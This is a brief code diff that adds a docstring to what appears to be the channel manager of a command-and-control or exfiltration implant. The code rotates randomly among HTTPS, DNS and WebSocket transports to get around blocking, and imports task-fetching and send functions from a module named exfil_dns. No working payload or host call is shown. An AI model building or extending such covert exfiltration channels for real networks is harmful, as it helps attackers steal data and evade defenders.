@@ -1,3 +1,12 @@
+"""
+Adaptive channel manager — randomized transport fallback across HTTPS, DNS, and WS.
+
+Current behavior: transports are shuffled on each call and tried in order until one
+succeeds. This provides basic resilience against single-channel blocking.
+
+Planned: weighted scoring with per-transport success/latency feedback integration.
+See issue tracker for roadmap.
+"""
 import random
 
 from core.exfil_dns import get_task_dns, send_via_dns
